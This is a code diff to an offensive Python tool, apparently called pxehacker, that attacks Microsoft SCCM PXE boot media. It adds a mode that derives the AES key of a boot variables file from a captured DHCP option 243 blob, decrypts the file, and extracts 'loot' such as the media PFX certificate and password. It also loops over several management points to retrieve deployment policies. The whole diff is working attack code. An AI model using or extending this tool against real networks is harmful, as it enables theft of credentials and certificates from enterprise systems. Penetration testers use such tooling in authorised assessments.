@@ -65,6 +65,22 @@ decrypt_parser.add_argument("-o", "--output", help="Output directory for loot fi
 hash_parser = subparsers.add_parser("hash", help="Extract SCCM hashcat hash from a local .boot.var file")
 hash_parser.add_argument("file", help="Path to the .boot.var file")
 
+# Derive-key mode — derive the .var AES key from a captured DHCP option 243 cryptokey blob
+derive_parser = subparsers.add_parser(
+    "derive-key",
+    help="Derive the .var AES key from a captured DHCP option 243 type-2 cryptokey blob (blank-password media)",
+)
+derive_parser.add_argument(
+    "cryptokey",
+    help="Cryptokey blob in hex, starting at the inner length byte (the data field of DHCP option 243 sub-record type 2)",
+)
+derive_parser.add_argument(
+    "-f", "--file",
+    help="Optional .boot.var file to decrypt with the derived key",
+    type=str, default=None,
+)
+derive_parser.add_argument("-o", "--output", help="Output directory for loot files (when --file is given)", type=str, default="./loot")
+
 # Loot mode — extract PFX and info from already-decrypted XML
 loot_parser = subparsers.add_parser("loot", help="Extract PFX cert and info from decrypted media variables XML")
 loot_parser.add_argument("xml_file", help="Path to decrypted media variables XML (produced by 'attack' or 'decrypt' modes)")
@@ -155,28 +171,62 @@ def main():
             xml_text = f.read()
 
         root = ET.fromstring(xml_text.encode("utf-16-le"))
-        mp_url = root.find('.//var[@name="SMSTSMP"]').text
+        smstsmp_raw = root.find('.//var[@name="SMSTSMP"]').text
+        # SMSTSMP can hold multiple MP URLs separated by '*'
+        mp_candidates = [u.strip() for u in smstsmp_raw.split("*") if u.strip()]
         if args.mode == "policies" and args.mp:
-            mp_url = args.mp
+            mp_candidates = [args.mp]
         site_code = root.find('.//var[@name="_SMSTSSiteCode"]').text
         media_guid = root.find('.//var[@name="_SMSMediaGuid"]').text
         pfx_hex = root.find('.//var[@name="_SMSTSMediaPFX"]').text
         pfx_bytes = bytes.fromhex(pfx_hex)
         pfx_password = media_guid[:31]
 
-        print(f"[*] Management Point: {mp_url}")
+        # Prefer GUIDs already present in variables.xml — saves a round trip and
+        # works even when the MP refuses MPKEYINFORMATIONMEDIA without auth.
+        def _var(name):
+            el = root.find(f'.//var[@name="{name}"]')
+            return el.text if el is not None else None
+        local_guids = {
+            "x64": _var("_SMSTSx64UnknownMachineGUID"),
+            "x86": _var("_SMSTSx86UnknownMachineGUID"),
+            "arm64": _var("_SMSTSarm64UnknownMachineGUID"),
+        }
+
+        print(f"[*] MP candidates: {mp_candidates}")
         print(f"[*] Site Code: {site_code}")
         print(f"[*] Media GUID: {media_guid}")
         print(f"[*] PFX Password: {pfx_password}")
+        if local_guids["x64"]:
+            print(f"[*] x64UnknownMachineGUID (from variables.xml): {local_guids['x64']}")
 
-        retriever = PolicyRetriever(mp_url, site_code, pfx_bytes, pfx_password)
-        if args.mode == "policies":
-            retriever.retrieve_policies(media_guid, args.output)
-            if args.fallback_local:
-                fallback_input = args.fallback_input or args.output
-                print(f"[*] Running local fallback from {os.path.abspath(fallback_input)}")
-                retriever.process_local_policy_blobs(fallback_input, args.output)
-        else:
+        last_error = None
+        retriever = None
+        for mp_url in mp_candidates:
+            print(f"[*] Trying MP: {mp_url}")
+            retriever = PolicyRetriever(mp_url, site_code, pfx_bytes, pfx_password)
+            if args.mode == "policies":
+                try:
+                    retriever.retrieve_policies(
+                        media_guid, args.output,
+                        machine_client_id_override=local_guids["x64"],
+                    )
+                    last_error = None
+                    break
+                except Exception as e:
+                    last_error = e
+                    print(f"[!] {mp_url}: {e}")
+                    continue
+            else:
+                break
+        if args.mode == "policies" and last_error is not None:
+            print(f"[!] All MP candidates failed. Last error: {last_error}")
+            sys.exit(1)
+        if args.mode == "policies" and args.fallback_local:
+            fallback_input = args.fallback_input or args.output
+            print(f"[*] Running local fallback from {os.path.abspath(fallback_input)}")
+            retriever.process_local_policy_blobs(fallback_input, args.output)
+        if args.mode == "policies-local":
             print(f"[*] Input directory: {os.path.abspath(args.input)}")
             retriever.process_local_policy_blobs(args.input, args.output)
         sys.exit(0)
@@ -231,6 +281,40 @@ def main():
                 print(f"[!] Deobfuscated: {plaintext}")
             except Exception as e:
                 print(f"[!] Failed to deobfuscate: {e}")
+        sys.exit(0)
+
+    # === Derive-key mode ===
+    if args.mode == "derive-key":
+        from lib import sccm
+
+        sccm_client = sccm.SCCM(None, None, None)
+        try:
+            cryptokey_bytes = bytes.fromhex(args.cryptokey)
+        except ValueError as e:
+            print(f"[!] Invalid hex for cryptokey: {e}")
+            sys.exit(1)
+        try:
+            derived = sccm_client.derive_blank_decryption_key(cryptokey_bytes)
+        except Exception as e:
+            print(f"[!] Key derivation failed: {e}")
+            print("[*] Expected input: data field of DHCP option 243 sub-record type 2,")
+            print("    starting at the inner length byte (cryptokey[0] = length).")
+            sys.exit(1)
+        print(f"[*] Derived .var AES key: {derived.hex()}")
+        if args.file:
+            try:
+                with open(args.file, "rb") as f:
+                    filedata = f.read()
+                aes_bits = sccm_client.detect_encryption_type(filedata)
+                print(f"[*] File size: {len(filedata)} bytes")
+                print(f"[*] Encryption: AES-{aes_bits}" if aes_bits else "[!] Unknown encryption type in header")
+                decrypted = sccm_client.decrypt_media_file(filedata, derived)
+                handle_decrypted_xml(sccm_client, decrypted, args.output)
+            except Exception as e:
+                print(f"[!] Decryption failed: {e}")
+                sys.exit(1)
+        else:
+            print(f"[*] Decrypt with: python3 pxehacker.py decrypt <variables_file> {derived.hex()}")
         sys.exit(0)
 
     # === Hash mode ===
